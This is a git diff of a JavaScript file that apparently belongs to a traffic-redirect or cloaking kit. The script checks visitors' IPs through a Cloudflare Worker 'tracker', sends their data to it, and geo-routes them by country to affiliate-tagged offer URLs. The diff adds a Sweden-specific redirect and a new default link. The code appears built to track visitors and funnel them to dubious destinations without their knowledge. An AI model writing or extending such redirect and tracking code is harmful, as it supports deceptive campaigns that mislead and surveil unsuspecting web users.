@@ -1,8 +1,9 @@
 // ========== CONFIGURATION ==========
 const WORKER_URL = 'https://trackerworkerv2.lugangxyz.workers.dev/verify';
 const IP_CHECK_URL = 'https://trackerworkerv2.lugangxyz.workers.dev/check-ip';
-const DEFAULT_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=121832&s1=G20&s2=G20';
+const SE_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=121832&s1=G20&s2=G20';
 const NORWAY_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=153951&s1=G20&s2=G20';
+const DEFAULT_REDIRECT_URL = 'https://glhpmr9.ladysearchs.com/xv7hcug'
 
 // ========== GLOBAL STATE ==========
 let userCountry = '';
@@ -138,8 +139,14 @@ function extractCampCode(fragmentData) {
 }
 
 // Pick the redirect URL based on country
+// - SE (Sweden) -> SE_REDIRECT_URL
+// - NO (Norway) -> NORWAY_REDIRECT_URL
+// - Otherwise   -> DEFAULT_REDIRECT_URL
 function getRedirectUrl() {
-    return (userCountry === 'NO') ? NORWAY_REDIRECT_URL : DEFAULT_REDIRECT_URL;
+    const country = (userCountry || '').toUpperCase();
+    if (country === 'SE') return SE_REDIRECT_URL;
+    if (country === 'NO') return NORWAY_REDIRECT_URL;
+    return DEFAULT_REDIRECT_URL;
 }
 
 // Send data to Cloudflare Worker and redirect.
